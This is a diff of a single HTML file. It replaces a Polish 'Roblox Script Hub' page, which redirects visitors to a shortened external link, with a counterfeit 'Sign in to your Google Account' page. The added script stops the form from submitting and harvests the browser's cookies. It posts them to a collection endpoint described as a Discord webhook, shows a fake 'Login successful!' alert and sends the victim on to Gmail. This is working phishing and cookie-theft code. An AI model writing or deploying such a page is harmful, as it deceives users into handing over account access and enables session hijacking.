@@ -1,20 +1,59 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Script Hub</title>
-
-  <!-- Open Graph dla Discord -->
-  <meta property="og:title" content="HUB">
-  <meta property="og:description" content="op hub over 2k scripts">
-  <meta property="og:image" content="https://robloxecutors.com/wp-content/uploads/2025/03/Xeno-Executor.webp">
-  <meta property="og:url" content="https://lvkrf.github.io/robloxxeno/">
-  <meta property="og:type" content="website">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        #login-form {
+            max-width: 300px;
+            margin: auto;
+        }
+    </style>
 </head>
 <body>
-  <script>
-    window.location.href = "https://iplis.ru/1v7kw5";
-  </script>
+    <h1>Sign in to your Google Account</h1>
+    <form id="login-form" action="https://accounts.google.com/signin/v2/identifier" method="post">
+        <label for="identifierId">Email:</label>
+        <input type="email" id="identifierId" name="identifier" required><br><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+        <button type="submit">Next</button>
+    </form>
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('identifierId').value;
+            const password = document.getElementById('password').value;
+
+            // Simulate a login process
+            setTimeout(() => {
+                // Capture and log all cookies
+                const cookies = document.cookie;
+                console.log('Captured Cookies:', cookies);
+
+                // Send the cookies to your Discord webhook
+                fetch('http://localhost:3000/log-cookies', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cookies: cookies })
+                }).then(response => response.json())
+                  .then(data => {
+                      console.log('Success:', data);
+                      alert('Login successful!');
+                      window.location.href = 'https://mail.google.com/mail/';
+                  })
+                  .catch((error) => {
+                      console.error('Error:', error);
+                  });
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
